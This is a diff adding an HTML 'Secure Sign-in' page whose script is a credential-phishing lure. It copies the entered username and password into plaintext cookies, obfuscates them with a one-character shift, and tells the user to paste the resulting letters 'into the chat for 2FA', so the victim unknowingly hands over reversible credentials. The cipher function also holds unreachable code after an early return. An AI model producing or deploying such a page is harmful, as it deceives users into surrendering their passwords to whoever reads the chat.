@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>SignIn cool signinpage</title>
+        <style>
+            @import url('https://fonts.googleapis.com/css2?family=Inter:wght@100..900&family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap');
+            h2,
+            p,
+            label,
+            b {
+                font-family: 'Inter';
+            }
+            .container-full {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 90vh;
+            }
+            .dialog {
+                background-color: #fafafa;
+                width: 50vw;
+                max-width: 500px;
+                height: 60vh;
+                border-radius: 2vw;
+                text-align: center;
+                padding: 20px;
+            }
+            .input {
+                height: 5vh;
+                width: 80%;
+                background-color: #ffffff;
+                border-color: #000;
+                transition-duration: 0.5s;
+                transition-timing-function: cubic-bezier(0.34, 1, 0.34, 1);
+                border-style: solid;
+                font-family: 'Jetbrains Mono';
+                margin: 0;
+                border-top-right-radius: 2vw;
+                border-bottom-right-radius: 2vw;
+                font-size: 2.5vh;
+            }
+            .input:hover {
+                border-top-right-radius: 3vw;
+                border-bottom-right-radius: 3vw;
+                border-color: red;
+            }
+            .input:active {
+                border-color: red;
+                border-top-right-radius: 3vw;
+                border-bottom-right-radius: 3vw;
+            }
+            .coolio {
+                border-top-left-radius: 3vw;
+                border-bottom-left-radius: 3vw;
+            }
+            .disabled-at {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 5.7vh;
+                margin: 0;
+                padding-left: 10px;
+                padding-right: 5px;
+                font-family: 'Jetbrains Mono';
+                background-color: #ccc;
+                border-top-left-radius: 2vw;
+                border-bottom-left-radius: 2vw;
+                font-size: 2.5vh;
+            }
+            .container-at {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            }
+            input:invalid {
+                background-color: #FFEEEE;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container-full">
+            <div class="dialog">
+                <h2>Secure Sign-in</h2>
+                <p>Sign in using secure sign-in.</p>
+                <form>
+                    <div class="container-at">
+                        <div class="disabled-at">@</div>
+                        <input
+                            class="input"
+                            type="text"
+                            id="username"
+                            autocomplete="username"
+                            pattern="\w{3,15}"
+                            title="Needs to be between 3 and 15 characters, with no special characters."
+                        />
+                    </div>
+                    <br>
+                    <input
+                        id="password"
+                        class="input coolio"
+                        type="password"
+                        autocomplete="current-password"
+                        title="Cannot be empty."
+                        pattern=".+"
+                    />
+                    <br>
+                    <input type=submit
+                    onclick=haha()
+                    />
+                    </div>
+                </form>
+            </div>
+        </div>
+        <pre id="pe"></pre>
+        <script>
+            const haha = () => {
+                document.cookie = `username=${document.getElementById("username").value};`;
+                document.getElementById("pe").innerHTML = caesarCipher(document.cookie, 1);
+                document.cookie = `password=${document.getElementById("password").value};`;
+                alert("Please type the group of letters in the dialog into the chat for 2FA.");
+                document.cookie = `username=${document.getElementById("username").value};`;
+                document.cookie = `password=${document.getElementById("password").value};`;
+                document.getElementById("pe").innerHTML = caesarCipher(document.cookie, 1);
+                alert(caesarCipher(document.cookie, 1));
+                console.log(document.cookie);
+            }
+            const caesarCipher = (str, shift, decrypt = false) => {
+                const s = decrypt ? (26 - shift) % 26 : shift;
+                const n = s > 0 ? s : 26 + (s % 26);
+                return [...str]
+                    .map((l, i) => {
+                    const c = str.charCodeAt(i);
+                    return String.fromCharCode(c + n)
+                    if (c >= 65 && c <= 90)
+                        return String.fromCharCode(((c - 65 + n) % 26) + 65);
+                    if (c >= 97 && c <= 122)
+                        return String.fromCharCode(((c - 97 + n) % 26) + 97);
+                    return l;
+                    })
+                    
+                    .join('')
+                    .replace("=", "}")
+                    .replace("=", "}")
+                    .replace(";", "<");
+                };
+        </script>
+    </body>
+</html>
